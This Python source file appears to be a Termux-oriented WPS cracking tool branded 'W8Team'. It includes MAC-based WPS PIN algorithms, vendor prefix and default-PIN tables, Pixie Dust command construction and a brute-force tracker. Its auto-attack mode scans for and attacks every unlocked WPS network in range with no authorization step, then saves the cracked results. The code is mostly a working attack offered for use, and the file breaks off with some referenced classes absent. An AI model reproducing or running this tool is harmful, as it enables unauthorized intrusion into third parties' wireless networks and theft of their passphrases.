#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import subprocess
import os
import tempfile
import shutil
import re
import codecs
import socket
import pathlib
import time
from datetime import datetime
import collections
import statistics
import csv
from pathlib import Path
from typing import Dict
import random
import json
import threading
import queue
import hashlib
from concurrent.futures import ThreadPoolExecutor
try:
    from pyfiglet import Figlet
except ImportError:
    Figlet = None
try:
    import psutil
except ImportError:
    psutil = None


class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(mac)
        else:
            raise ValueError('MAC address must be string or integer')

    @property
    def string(self):
        return self._str_repr

    @string.setter
    def string(self, value):
        self._str_repr = value
        self._int_repr = self._mac2int(value)

    @property
    def integer(self):
        return self._int_repr

    @integer.setter
    def integer(self, value):
        self._int_repr = value
        self._str_repr = self._int2mac(value)

    def __int__(self):
        return self.integer

    def __str__(self):
        return self.string

    def __iadd__(self, other):
        self.integer += other

    def __isub__(self, other):
        self.integer -= other

    def __eq__(self, other):
        return self.integer == other.integer

    def __ne__(self, other):
        return self.integer != other.integer

    def __lt__(self, other):
        return self.integer < other.integer

    def __gt__(self, other):
        return self.integer > other.integer

    @staticmethod
    def _mac2int(mac):
        return int(mac.replace(':', ''), 16)

    @staticmethod
    def _int2mac(mac):
        mac = hex(mac).split('x')[-1].upper()
        mac = mac.zfill(12)
        mac = ':'.join(mac[i:i+2] for i in range(0, 12, 2))
        return mac

    def __repr__(self):
        return 'NetworkAddress(string={}, integer={})'.format(
            self._str_repr, self._int_repr)


class WPSpin:
    """WPS pin generator"""
    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2

        self.algos = {'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
                      'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
                      'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
                      'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
                      'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
                      'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
                      'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
                      # Static pin algos
                      'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
                      'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
                      'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
                      'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
                      'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
                      'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
                      'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
                      'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
                      'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
                      'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
                      'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
                      'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
                      'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
                      'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
                      'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
                      'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
                      'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
                      'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
                      'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
                      'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
                      'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
                      'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
                      'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521}}

    @staticmethod
    def checksum(pin):
        """
        Standard WPS checksum algorithm.
        @pin — A 7 digit pin to calculate the checksum for.
        Returns the checksum value.
        """
        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return (10 - accum % 10) % 10

    def generate(self, algo, mac):
        """
        WPS pin generator
        @algo — the WPS pin algorithm ID
        Returns the WPS pin string value
        """
        mac = NetworkAddress(mac)
        if algo not in self.algos:
            raise ValueError('Invalid WPS pin algorithm')
        pin = self.algos[algo]['gen'](mac)
        if algo == 'pinEmpty':
            return pin
        pin = pin % 10000000
        pin = str(pin) + str(self.checksum(pin))
        return pin.zfill(8)

    def getAll(self, mac, get_static=True):
        """
        Get all WPS pin's for single MAC
        """
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getList(self, mac, get_static=True):
        """
        Get all WPS pin's for single MAC as list
        """
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            res.append(self.generate(ID, mac))
        return res

    def getSuggested(self, mac):
        """
        Get all suggested WPS pin's for single MAC
        """
        algos = self._suggest(mac)
        res = []
        for ID in algos:
            algo = self.algos[ID]
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getSuggestedList(self, mac):
        """
        Get all suggested WPS pin's for single MAC as list
        """
        algos = self._suggest(mac)
        res = []
        for algo in algos:
            res.append(self.generate(algo, mac))
        return res

    def getLikely(self, mac):
        res = self.getSuggestedList(mac)
        if res:
            return res[0]
        else:
            return None

    def _suggest(self, mac):
        """
        Get algos suggestions for single MAC
        Returns the algo ID
        """
        mac = mac.replace(':', '').upper()
        algorithms = {
            'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 'FCF528', 'FEF528', '4C9EFF', '0014D1', 'D8EB97', '1C7EE5', '84C9B2', 'FC7516', '14D64D', '9094E4', 'BCF685', 'C4A81D', '00664B', '087A4C', '14B968', '2008ED', '346BD3', '4CEDDE', '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30', 'F49FF3', '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F4', 'F8C091', '001CDF', '002275', '08863B', '00B00C', '081075', 'C83A35', '0022F7', '001F1F', '00265B', '68B6CF', '788DF7', 'BC1401', '202BC1', '308730', '5C4CA9', '62233D', '623CE4', '623DFF', '6253D4', '62559C', '626BD3', '627D5E', '6296BF', '62A8E4', '62B686', '62C06F', '62C61F', '62C714', '62CBA8', '62CDBE', '62E87B', '6416F0', '6A1D67', '6A233D', '6A3DFF', '6A53D4', '6A559C', '6A6BD3', '6A96BF', '6A7D5E', '6AA8E4', '6AC06F', '6AC61F', '6AC714', '6ACBA8', '6ACDBE', '6AD15E', '6AD167', '721D67', '72233D', '723CE4', '723DFF', '7253D4', '72559C', '726BD3', '727D5E', '7296BF', '72A8E4', '72C06F', '72C61F', '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B', '0026CE', '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D', 'D86CE9', 'DC7144', '801F02', 'E47CF9', '000CF6', '00A026', 'A0F3C1', '647002', 'B0487A', 'F81A67', 'F8D111', '34BA9A', 'B4944E'),
            'pin28': ('200BC7', '4846FB', 'D46AA8', 'F84ABF'),
            'pin32': ('000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B', '48EE0C', '802689', '908D78', 'E8CC18', '2CAB25', '10BF48', '14DAE9', '3085A9', '50465D', '5404A6', 'C86000', 'F46D04', '3085A9', '801F02'),
            'pinDLink': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB', 'CCB255', 'FC7516', '0014D1', 'D8EB97'),
            'pinDLink1': ('0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0', '002401', '00265A', '14D64D', '1C7EE5', '340804', '5CD998', '84C9B2', 'B8A386', 'C8BE19', 'C8D3A3', 'CCB255', '0014D1'),
            'pinASUS': ('049226', '04D9F5', '08606E', '0862669', '107B44', '10BF48', '10C37B', '14DDA9', '1C872C', '1CB72C', '2C56DC', '2CFDA1', '305A3A', '382C4A', '38D547', '40167E', '50465D', '54A050', '6045CB', '60A44C', '704D7B', '74D02B', '7824AF', '88D7F6', '9C5C8E', 'AC220B', 'AC9E17', 'B06EBF', 'BCEE7B', 'C860007', 'D017C2', 'D850E6', 'E03F49', 'F0795978', 'F832E4', '00072624', '0008A1D3', '00177C', '001EA6', '00304FB', '00E04C0', '048D38', '081077', '081078', '081079', '083E5D', '10FEED3C', '181E78', '1C4419', '2420C7', '247F20', '2CAB25', '3085A98C', '3C1E04', '40F201', '44E9DD', '48EE0C', '5464D9', '54B80A', '587BE906', '60D1AA21', '64517E', '64D954', '6C198F', '6C7220', '6CFDB9', '78D99FD', '7C2664', '803F5DF6', '84A423', '88A6C6', '8C10D4', '8C882B00', '904D4A', '907282', '90F65290', '94FBB2', 'A01B29', 'A0F3C1E', 'A8F7E00', 'ACA213', 'B85510', 'B8EE0E', 'BC3400', 'BC9680', 'C891F9', 'D00ED90', 'D084B0', 'D8FEE3', 'E4BEED', 'E894F6F6', 'EC1A5971', 'EC4C4D', 'F42853', 'F43E61', 'F46BEF', 'F8AB05', 'FC8B97', '7062B8', '78542E', 'C0A0BB8C', 'C412F5', 'C4A81D', 'E8CC18', 'EC2280', 'F8E903F4'),
            'pinAirocon': ('0007262F', '000B2B4A', '000EF4E7', '001333B', '00177C', '001AEF', '00E04BB3', '02101801', '0810734', '08107710', '1013EE0', '2CAB25C7', '788C54', '803F5DF6', '94FBB2', 'BC9680', 'F43E61', 'FC8B97'),
            'pinEmpty': ('E46F13', 'EC2280', '58D56E', '1062EB', '10BEF5', '1C5F2B', '802689', 'A0AB1B', '74DADA', '9CD643', '68A0F6', '0C96BF', '20F3A3', 'ACE215', 'C8D15E', '000E8F', 'D42122', '3C9872', '788102', '7894B4', 'D460E3', 'E06066', '004A77', '2C957F', '64136C', '74A78E', '88D274', '702E22', '74B57E', '789682', '7C3953', '8C68C8', 'D476EA', '344DEA', '38D82F', '54BE53', '709F2D', '94A7B7', '981333', 'CAA366', 'D0608C'),
            'pinCisco': ('001A2B', '00248C', '002618', '344DEB', '7071BC', 'E06995', 'E0CB4E', '7054F5'),
            'pinBrcm1': ('ACF1DF', 'BCF685', 'C8D3A3', '988B5D', '001AA9', '14144B', 'EC6264'),
            'pinBrcm2': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19'),
            'pinBrcm3': ('14D64D', '1C7EE5', '28107B', 'B8A386', 'BCF685', 'C8BE19', '7C034C'),
            'pinBrcm4': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm5': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm6': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinAirc1': ('181E78', '40F201', '44E9DD', 'D084B0'),
            'pinAirc2': ('84A423', '8C10D4', '88A6C6'),
            'pinDSL2740R': ('00265A', '1CBDB9', '340804', '5CD998', '84C9B2', 'FC7516'),
            'pinRealtek1': ('0014D1', '000C42', '000EE8'),
            'pinRealtek2': ('007263', 'E4BEED'),
            'pinRealtek3': ('08C6B3',),
            'pinUpvel': ('784476', 'D4BF7F0', 'F8C091'),
            'pinUR814AC': ('D4BF7F60',),
            'pinUR825AC': ('D4BF7F5',),
            'pinOnlime': ('D4BF7F', 'F8C091', '144D67', '784476', '0014D1'),
            'pinEdimax': ('801F02', '00E04C'),
            'pinThomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
            'pinHG532x': ('00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED', '2469A5', '346BD3', '786A89', '88E3AB', '9CC172', 'ACE215', 'D07AB5', 'CCA223', 'E8CD2D', 'F80113', 'F83DFF'),
            'pinH108L': ('4C09B4', '4CAC0A', '84742A4', '9CD24B', 'B075D5', 'C864C7', 'DC028E', 'FCC897'),
            'pinONO': ('5C353B', 'DC537C')
        }
        res = []
        for algo_id, masks in algorithms.items():
            if mac.startswith(masks):
                res.append(algo_id)
        return res

    def pin24(self, mac):
        return mac.integer & 0xFFFFFF

    def pin28(self, mac):
        return mac.integer & 0xFFFFFFF

    def pin32(self, mac):
        return mac.integer % 0x100000000

    def pinDLink(self, mac):
        # Get the NIC part
        nic = mac.integer & 0xFFFFFF
        # Calculating pin
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) +
                ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) +
                ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin

    def pinDLink1(self, mac):
        mac.integer += 1
        return self.pinDLink(mac)

    def pinASUS(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
        return int(pin)

    def pinAirocon(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ((b[0] + b[1]) % 10)\
        + (((b[5] + b[0]) % 10) * 10)\
        + (((b[4] + b[5]) % 10) * 100)\
        + (((b[3] + b[4]) % 10) * 1000)\
        + (((b[2] + b[3]) % 10) * 10000)\
        + (((b[1] + b[2]) % 10) * 100000)\
        + (((b[0] + b[1]) % 10) * 1000000)
        return pin


def recvuntil(pipe, what):
    s = ''
    while True:
        inp = pipe.stdout.read(1)
        if inp == '':
            return s
        s += inp
        if what in s:
            return s


def get_hex(line):
    a = line.split(':', 3)
    return a[2].replace(' ', '').upper()


class PixiewpsData:
    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''

    def clear(self):
        self.__init__()

    def got_all(self):
        return (self.pke and self.pkr and self.e_nonce and self.authkey
                and self.e_hash1 and self.e_hash2)

    def get_pixie_cmd(self, full_range=False):
        pixiecmd = "pixiewps --pke {} --pkr {} --e-hash1 {}"\
                    " --e-hash2 {} --authkey {} --e-nonce {}".format(
                    self.pke, self.pkr, self.e_hash1,
                    self.e_hash2, self.authkey, self.e_nonce)
        if full_range:
            pixiecmd += ' --force'
        return pixiecmd


class ConnectionStatus:
    def __init__(self):
        self.status = ''   # Must be WSC_NACK, WPS_FAIL or GOT_PSK
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''

    def isFirstHalfValid(self):
        return self.last_m_message > 5

    def clear(self):
        self.__init__()


class BruteforceStatus:
    def __init__(self):
        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.mask = ''
        self.last_attempt_time = time.time()   # Last PIN attempt start time
        self.attempts_times = collections.deque(maxlen=15)
        self.total_attempts = 0
        self.successful_attempts = 0
        self.failed_attempts = 0
        self.counter = 0
        self.statistics_period = 5
        self.session_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]

    def display_status(self):
        average_pin_time = statistics.mean(self.attempts_times)
        if len(self.mask) == 4:
            percentage = int(self.mask) / 11000 * 100
        else:
            percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
        
        # Enhanced status display
        success_rate = (self.successful_attempts / max(self.total_attempts, 1)) * 100
        elapsed_time = time.time() - time.mktime(datetime.strptime(self.start_time, "%Y-%m-%d %H:%M:%S").timetuple())
        eta = (elapsed_time / max(percentage, 1)) * (100 - percentage) if percentage > 0 else 0
        
        print(f'[*] Progress: {percentage:.2f}% | Session: {self.session_id}')
        print(f'[*] Speed: {average_pin_time:.2f}s/pin | Success Rate: {success_rate:.1f}%')
        print(f'[*] ETA: {eta/60:.1f} min | Attempts: {self.total_attempts}')

    def registerAttempt(self, mask):
        self.mask = mask
        self.counter += 1
        current_time = time.time()
        self.attempts_times.append(current_time - self.last_attempt_time)
        self.last_attempt_time = current_time
        if self.counter == self.statistics_period:
            self.counter = 0
            self.display_status()

    def clear(self):
        self.__init__()


class EnhancedReporter:
    """Enhanced reporting system for better output and analytics"""
    def __init__(self, reports_dir):
        self.reports_dir = reports_dir
        self.session_data = {
            'session_id': hashlib.md5(str(time.time()).encode()).hexdigest()[:8],
            'start_time': datetime.now().isoformat(),
            'targets': [],
            'attempts': [],
            'successes': [],
            'system_info': self._get_system_info()
        }
    
    def _get_system_info(self):
        """Collect system information for reporting"""
        info = {
            'python_version': sys.version,
            'platform': sys.platform,
            'timestamp': datetime.now().isoformat()
        }
        if psutil:
            info['cpu_count'] = psutil.cpu_count()
            info['memory'] = psutil.virtual_memory().total
        return info
    
    def log_attempt(self, bssid, pin, success=False, method='', time_taken=0):
        """Log each attack attempt"""
        attempt = {
            'timestamp': datetime.now().isoformat(),
            'bssid': bssid,
            'pin': pin,
            'success': success,
            'method': method,
            'time_taken': time_taken
        }
        self.session_data['attempts'].append(attempt)
        if success:
            self.session_data['successes'].append(attempt)
    
    def generate_html_report(self):
        """Generate a professional HTML report"""
        html_template = '''
<!DOCTYPE html>
<html>
<head>
    <title>W8Team WiFi Penetration Test Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; border-radius: 8px; margin-bottom: 20px; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; }
        .stat-card { background: #f8f9fa; padding: 15px; border-radius: 8px; text-align: center; border-left: 4px solid #667eea; }
        .stat-number { font-size: 2em; font-weight: bold; color: #667eea; }
        .stat-label { color: #666; margin-top: 5px; }
        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background-color: #f8f9fa; }
        .success { color: #28a745; font-weight: bold; }
        .failed { color: #dc3545; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ W8Team WiFi Penetration Test Report</h1>
            <p>Session ID: {session_id} | Generated: {timestamp}</p>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-number">{total_attempts}</div>
                <div class="stat-label">Total Attempts</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{success_count}</div>
                <div class="stat-label">Successful Attacks</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{success_rate:.1f}%</div>
                <div class="stat-label">Success Rate</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{avg_time:.1f}s</div>
                <div class="stat-label">Avg Time/Attempt</div>
            </div>
        </div>

        <h2>📊 Attack Results</h2>
        <table>
            <tr>
                <th>Timestamp</th>
                <th>Target BSSID</th>
                <th>PIN</th>
                <th>Method</th>
                <th>Status</th>
                <th>Time (s)</th>
            </tr>
            {attempts_rows}
        </table>
        
        <h2>✅ Successful Attacks</h2>
        <table>
            <tr>
                <th>BSSID</th>
                <th>PIN Found</th>
                <th>Method Used</th>
                <th>Time Taken</th>
            </tr>
            {success_rows}
        </table>
        
        <div style="margin-top: 40px; padding: 20px; background: #f8f9fa; border-radius: 8px;">
            <h3>🔧 System Information</h3>
            <p><strong>Python Version:</strong> {python_version}</p>
            <p><strong>Platform:</strong> {platform}</p>
            <p><strong>Session Duration:</strong> {session_duration}</p>
        </div>
    </div>
</body>
</html>
        '''
        
        # Calculate statistics
        total_attempts = len(self.session_data['attempts'])
        success_count = len(self.session_data['successes'])
        success_rate = (success_count / max(total_attempts, 1)) * 100
        avg_time = sum(a.get('time_taken', 0) for a in self.session_data['attempts']) / max(total_attempts, 1)
        
        # Generate attempt rows
        attempts_rows = ''
        for attempt in self.session_data['attempts'][-50:]:  # Last 50 attempts
            status_class = 'success' if attempt['success'] else 'failed'
            status_text = '✅ SUCCESS' if attempt['success'] else '❌ FAILED'
            attempts_rows += f'''
            <tr>
                <td>{attempt['timestamp'][:19]}</td>
                <td>{attempt['bssid']}</td>
                <td>{attempt['pin']}</td>
                <td>{attempt['method']}</td>
                <td class="{status_class}">{status_text}</td>
                <td>{attempt['time_taken']:.1f}</td>
            </tr>
            '''
        
        # Generate success rows
        success_rows = ''
        for success in self.session_data['successes']:
            success_rows += f'''
            <tr>
                <td>{success['bssid']}</td>
                <td>{success['pin']}</td>
                <td>{success['method']}</td>
                <td>{success['time_taken']:.1f}s</td>
            </tr>
            '''
        
        # Calculate session duration
        start_time = datetime.fromisoformat(self.session_data['start_time'])
        session_duration = str(datetime.now() - start_time).split('.')[0]
        
        # Format the HTML
        html_content = html_template.format(
            session_id=self.session_data['session_id'],
            timestamp=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            total_attempts=total_attempts,
            success_count=success_count,
            success_rate=success_rate,
            avg_time=avg_time,
            attempts_rows=attempts_rows,
            success_rows=success_rows,
            python_version=self.session_data['system_info']['python_version'].split()[0],
            platform=self.session_data['system_info']['platform'],
            session_duration=session_duration
        )
        
        # Save HTML report
        if not os.path.exists(self.reports_dir):
            os.makedirs(self.reports_dir)
        
        filename = f"{self.reports_dir}/report_{self.session_data['session_id']}.html"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        return filename


class AutoAttacker:
    """Auto attack system for high vulnerability networks"""
    def __init__(self, interface="wlan0"):
        self.interface = interface
        self.companion = None
        self.scanner = None
        self.vulnerable_targets = []
        self.attacked_targets = set()
        
    def auto_find_and_attack(self):
        """Automatically find and attack ALL networks with 30-second timeout"""
        print("[*] 🚀 Starting Enhanced Auto Attack Mode...")
        print("[*] 🎯 Will try EVERY WPS network with Pixie Dust (30 seconds each)")
        print("[*] 📡 Scanning for ALL WPS networks...")
        
        # Initialize scanner - scan ALL networks, not just vulnerable ones
        try:
            with open('vulnwsc.txt', 'r', encoding='utf-8') as file:
                vuln_list = file.read().splitlines()
        except FileNotFoundError:
            vuln_list = []
            
        self.scanner = WiFiScanner(self.interface, vuln_list, reverse_scan=False)
        networks = self.scanner.iw_scanner()
        
        if not networks:
            print("[-] No WPS networks found")
            return
            
        # Get ALL WPS networks (not just vulnerable ones)
        all_networks = []
        for num, network in networks.items():
            if network.get('WPS') and not network.get('WPS locked', False):
                all_networks.append(network)
                
        if not all_networks:
            print("[-] No attackable WPS networks found")
            return
            
        # Sort by signal strength (strongest first)
        all_networks.sort(key=lambda x: x.get('Level', -100), reverse=True)
            
        total_networks = len(all_networks)
        print(f"[+] Found {total_networks} WPS networks to attack!")
        print(f"[*] ⏱️  Each attack will timeout after 30 seconds")
        print(f"[*] 📊 Estimated total time: {total_networks * 0.5:.1f} minutes")
        print("")
        
        successful_attacks = 0
        failed_attacks = 0
        
        # Auto attack EVERY network
        for i, network in enumerate(all_networks, 1):
            bssid = network['BSSID']
            essid = network['ESSID']
            signal = network.get('Level', 'Unknown')
            
            if bssid in self.attacked_targets:
                print(f"[{i}/{total_networks}] ⏭️  Skipping {essid} (already attacked)")
                continue
                
            print(f"\n[{i}/{total_networks}] 🎯 Attacking: {essid}")
            print(f"[*] 📶 BSSID: {bssid} | Signal: {signal} dBm")
            print(f"[*] ⏱️  Timeout: 30 seconds | Remaining: {total_networks - i} networks")
            
            self.attacked_targets.add(bssid)
            
            # Initialize companion for attack
            self.companion = Companion(self.interface, save_result=True)
            
            # Try Pixie Dust with 30-second timeout
            start_time = time.time()
            success = self._pixie_attack_with_timeout(self.companion, bssid, timeout=30)
            elapsed_time = time.time() - start_time
            
            if success:
                successful_attacks += 1
                print(f"[+] ✅ SUCCESS! Cracked {essid} in {elapsed_time:.1f} seconds")
                print(f"[+] 🎉 Total successful: {successful_attacks}/{i}")
                self._save_to_auto_results(bssid, essid, f"Auto Pixie Dust ({elapsed_time:.1f}s)")
            else:
                failed_attacks += 1
                print(f"[-] ❌ Failed to crack {essid} after {elapsed_time:.1f} seconds")
                print(f"[*] 📊 Failed: {failed_attacks} | Success: {successful_attacks}")
                
            self.companion.cleanup()
            
            # Progress summary
            progress = (i / total_networks) * 100
            print(f"[*] 📈 Progress: {progress:.1f}% ({i}/{total_networks})")
            
            # Small delay between attacks
            if i < total_networks:
                print("[*] ⏳ Waiting 3 seconds before next attack...")
                time.sleep(3)
                
        # Final summary
        print("\n" + "="*60)
        print("🎯 AUTO ATTACK SUMMARY")
        print("="*60)
        print(f"📊 Total Networks Scanned: {total_networks}")
        print(f"✅ Successful Attacks: {successful_attacks}")
        print(f"❌ Failed Attacks: {failed_attacks}")
        print(f"📈 Success Rate: {(successful_attacks/total_networks)*100:.1f}%")
        print(f"⏱️  Total Time: {(time.time() - start_time)/60:.1f} minutes")
        print("="*60)
        
        if successful_attacks > 0:
            print(f"🎉 Congratulations! You cracked {successful_attacks} networks!")
            print("💾 All passwords saved to files automatically")
        else:
            print("😔 No networks were cracked this time")
            print("💡 Try again later or use manual targeting")
            
    def _pixie_attack_with_timeout(self, companion, bssid, timeout=30):
        """Pixie Dust attack with timeout"""
        import signal
        
        class TimeoutException(Exception):
            pass
        
        def timeout_handler(signum, frame):
            raise TimeoutException("Attack timed out")
        
        try:
            # Set alarm for timeout
            signal.signal(signal.SIGALRM, timeout_handler)
            signal.alarm(timeout)
            
            print(f"[*] 🧚 Starting Pixie Dust attack (max {timeout}s)...")
            success = companion.single_connection(bssid, pixiemode=True)
            
            # Cancel alarm
            signal.alarm(0)
            return success
            
        except TimeoutException:
            print(f"[*] ⏰ Attack timed out after {timeout} seconds")
            signal.alarm(0)
            return False
        except Exception as e:
            print(f"[-] ❌ Attack error: {e}")
            signal.alarm(0)
            return False
            
    def _save_to_auto_results(self, bssid, essid, method):
        """Save auto attack results"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        result_line = f"{timestamp} | {bssid} | {essid} | {method} | SUCCESS\n"
        
        with open("auto_attack_results.txt", "a", encoding="utf-8") as f:
            f.write(result_line)


class MenuHandler:
    """Interactive menu system"""
    def __init__(self):
        self.interface = self._get_wifi_interface()
        self.auto_attacker = AutoAttacker(self.interface)
        
    def _get_wifi_interface(self):
        """Automatically detect WiFi interface for Termux"""
        try:
            # Common Termux WiFi interfaces
            possible_interfaces = ["wlan0", "wlo1", "wlp2s0", "wlx", "wifi0"]
            
            result = subprocess.run("ip link show", shell=True, capture_output=True, text=True)
            output = result.stdout
            
            for interface in possible_interfaces:
                if interface in output:
                    return interface
                    
            # Fallback to wlan0
            return "wlan0"
        except:
            return "wlan0"
            
    def show_wifi_networks(self, attack_mode="pixie"):
        """Show available networks and let user select"""
        try:
            with open('vulnwsc.txt', 'r', encoding='utf-8') as file:
                vuln_list = file.read().splitlines()
        except FileNotFoundError:
            vuln_list = []
            
        scanner = WiFiScanner(self.interface, vuln_list, reverse_scan=False)
        networks = scanner.iw_scanner()
        
        if not networks:
            print("[-] No WPS networks found")
            return None
            
        while True:
            try:
                choice = input("\n[?] Select network number (or 'r' to rescan): ").strip()
                if choice.lower() == 'r':
                    return self.show_wifi_networks(attack_mode)
                    
                network_num = int(choice)
                if network_num in networks:
                    selected_network = networks[network_num]
                    return self._attack_selected_network(selected_network, attack_mode)
                else:
                    print("[-] Invalid selection")
            except ValueError:
                print("[-] Please enter a valid number")
            except KeyboardInterrupt:
                return None
                
